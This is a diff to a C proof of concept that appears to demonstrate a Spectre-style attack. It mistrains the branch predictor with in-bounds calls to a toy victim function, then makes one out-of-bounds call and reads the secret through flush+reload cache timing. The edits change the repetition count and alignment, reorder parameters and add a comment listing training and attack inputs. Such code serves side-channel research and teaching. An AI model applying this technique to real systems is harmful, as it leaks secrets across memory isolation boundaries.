@@ -6,7 +6,7 @@
 #include "../lib/print_results.c"
 
 #define N_PAGES 256
-#define REPETITIONS 1
+#define REPETITIONS 10
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
 #define SECRET_SIZE 9
@@ -20,7 +20,7 @@ typedef struct vars {
 } vars_t;
 vars_t stack;
 
-int buf_size __attribute__((aligned(256))) = BUF_SIZE;
+int buf_size __attribute__((aligned(128))) = BUF_SIZE;
 
 /*
  * Variables required in cache:
@@ -33,8 +33,11 @@ int buf_size __attribute__((aligned(256))) = BUF_SIZE;
  *
  * Variables required in mem:
  *  buf_size
+ *
+ * Training: user_id={0,1,2...BUF_SIZE-1}   user_char={a,b,c...z}   user_password = 'x' secret_index={iterate through SECRET}
+ * Attack:   user_id=BUF_SIZE               user_char='s'           user_password = 's' secret_index={iterate through SECRET}
  */
-void victim_func(int user_id, char user_char, char user_password, cp_t* flush_reload_arr, int secret_index) {
+void victim_func(int user_id, char user_char, char user_password, int secret_index, cp_t* flush_reload_arr) {
     stack.password = 'x';
     flush(&buf_size);
     cpuid();
@@ -63,19 +66,19 @@ int* prepare(int secret_index) {
 
     for(int i = 0; i < n_accesses; i++) {
         user_ids[i]             = i % BUF_SIZE;
-        user_pwds[i]            = 'x';
         user_chars[i]           = 'a' + (i%26);
+        user_pwds[i]            = 'x';
     }
 
     //set up parameters for attack function call.
     user_ids   [n_accesses - 1] = BUF_SIZE;
-    user_pwds  [n_accesses - 1] = 's';
     user_chars [n_accesses - 1] = 's';
+    user_pwds  [n_accesses - 1] = 's';
     cpuid();
 
     //Misstrain branch predictor, last iteration is out-of-bounds attack function call
     for(int i = 0; i < n_accesses; i++) {
-        victim_func(user_ids[i], user_chars[i], user_pwds[i], flush_reload_arr, secret_index);
+        victim_func(user_ids[i], user_chars[i], user_pwds[i], secret_index, flush_reload_arr);
         cpuid();
 
         //flush hits from training phase (all but last access)
